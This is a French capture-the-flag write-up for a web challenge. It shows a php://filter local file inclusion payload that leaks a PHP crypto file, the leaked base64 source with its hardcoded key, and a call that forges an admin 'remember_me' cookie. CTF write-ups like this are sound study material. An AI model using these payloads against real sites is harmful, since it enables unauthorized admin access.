# Jamais sans mon riz - flag 3

Auteur : [HappoSnake](https://github.com/pathibault/)

Briève description : 

Viens en apprendre un peu plus sur ta vraie passion, et profites-en pour peaufiner tes connaissances sur les vulnérabilités webs! Une suite de défis qui progressent en difficulté tout au long du parcours, de débutant à expérizmenté.


# Sources
- https://finctf.ettic.net/challenges#Flag%202-33


# Solution
## 1. En analysant le code de la page [login.php](../login.php), nous voyons qu'avec un cookie "remember_me" nous pouvons être identifié comme un utilisateur admin

## 2. Pour généré un cookie, nous avons besoin du fichier [crypto.php](../crypto.php) qui est inclu dans le fichier [login.php](../login.php). Utilisons encore la vulnérabilité LFI.
```
?postid=php://filter/convert.base64-encode/resource=admin/lib/crypto.php
```

## 3. Décodons la chaine reçu pour trouver le code source de la page [crypto.php](../crypto.php)
```
PD9waHAKCiRrZXkgPSAiNVVQM1JfUzNDVVJFLEszWSI7CiRjaXBoZXI9IkFFUy0xMjgtQ0JDIjsKCmZ1bmN0aW9uIGdlbmVyYXRlX3JlbWVtYmVyX21lX2Nvb2tpZSgkdXNlcm5hbWUsICRhZG1pbikgewogICAgJGl2ID0gc3Vic3RyKG1kNShtdF9yYW5kKCkpLCAwLCAxNik7CiAgICAkdCA9IHRpbWUoKSArICgzNjAwICogMjQgKiAzNjUpOwogICAgJGRhdGEgPSAkdXNlcm5hbWUgLiAifCIgLiAkdCAuICJ8IiAuICRhZG1pbjsKICAgIHJldHVybiBiYXNlNjRfZW5jb2RlKGVuY3J5cHQoJGRhdGEsICRpdikgLiAifCIgLiAkaXYpOwp9CgpmdW5jdGlvbiB2YWxpZGF0ZV9yZW1lbWJlcl9tZV9jb29raWUoJGNvb2tpZSkgewogICAgZ2xvYmFsICRrZXksICRjaXBoZXI7CiAgICB0cnkgewogICAgICAgICRjb29raWVfZXhwZW5kZWQgPSBleHBsb2RlKCJ8IiwgYmFzZTY0X2RlY29kZSgkY29va2llKSk7CiAgICAgICAgJGRlY3J5cHRlZF9jb29raWUgPSBkZWNyeXB0KCRjb29raWVfZXhwZW5kZWRbMF0sICRjb29raWVfZXhwZW5kZWRbMV0pOwogICAgICAgIAogICAgICAgIGlmKCEkZGVjcnlwdGVkX2Nvb2tpZSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAkZXhwX2RfY29va2llID0gZXhwbG9kZSgifCIsICRkZWNyeXB0ZWRfY29va2llKTsKICAgICAgICAKICAgICAgICBpZiAoJGV4cF9kX2Nvb2tpZVsxXSA8IHRpbWUoKSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIC8vIFRPRE86IEFqb3V0ZXIgZGVzIGNvbXB0ZXMgdXNlcgogICAgICAgIGlmICgkZXhwX2RfY29va2llWzJdICE9ICIxIikgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CiAgICAgICAgdGhyb3cgJGU7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIHJldHVybiAkZXhwX2RfY29va2llOwp9CgpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCAkaXYpIHsKICAgIGdsb2JhbCAka2V5LCAkY2lwaGVyOwogICAgLy8gJGNpcGhlcnRleHRfcmF3ID0gb3BlbnNzbF9lbmNyeXB0KCRkYXRhLCAkY2lwaGVyLCAka2V5LCAwLCAkaXYpOwogICAgLy8gcmV0dXJuIGJhc2U2NF9lbmNvZGUoY2lwaGVydGV4dF9yYXcpOwogICAgcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgJGNpcGhlciwgJGtleSwgMCwgJGl2KTsKfQoKZnVuY3Rpb24gZGVjcnlwdCgkY29va2llLCAkaXYpIHsKICAgIGdsb2JhbCAka2V5LCAkY2lwaGVyOwogICAgLy8gJGNpcGhlcnRleHRfcmF3ID0gYmFzZTY0X2RlY29kZSgkY29va2llKTsKICAgIC8vIHJldHVybiBvcGVuc3NsX2RlY3J5cHQoJGNpcGhlcnRleHRfcmF3LCAkY2lwaGVyLCAka2V5LCAwLCAkaXYpOwogICAgcmV0dXJuIG9wZW5zc2xfZGVjcnlwdCgkY29va2llLCAkY2lwaGVyLCAka2V5LCAwLCAkaXYpOwp9Cgo/Pg==
```

## 4. Nous avons maintenant la possibilité de créer un jeton. Nous pouvons via w3schools.com rouler le scipt de crypto et ajouter la ligne suivante à la fin
```
echo generate_remember_me_cookie("admin", 1);
```

## 5. Nous pouvons maintenant ajouter un cookie dans notre navigateur "remember_me" avec la valeur obtenu pour accéder à la partie admin et obtenir le flag.

<img src=./flag.png>